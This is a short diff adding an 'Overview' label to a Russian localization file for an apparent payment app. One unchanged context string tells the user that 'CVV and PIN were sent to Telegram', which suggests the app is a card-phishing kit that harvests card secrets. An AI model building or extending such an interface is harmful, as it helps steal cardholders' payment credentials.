@@ -535,6 +535,7 @@ export const ru = {
   "cf.resend": "Отправить код ещё раз",
   "cf.success": "Готово",
   "cf.successHint": "CVV и PIN отправлены в Telegram",
+  "ov.overview": "Обзор",
 "common.swipeConfirm": "Проведите вправо, чтобы подтвердить",
   "common.swipeTransfer": "Проведите вправо, чтобы перевести",
   "pay.title": "Оплата и переводы",
